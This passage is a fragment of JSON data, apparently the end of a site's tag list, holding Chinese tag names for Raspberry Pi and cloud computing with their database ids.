00gf34pialuo59eg"},{"name":"树霉派","_id":"clgrho2hg00gm34pictmt1ito"},{"name":"云计算","_id":"clgrjlxmd00c77opi0johf6nz"}]}}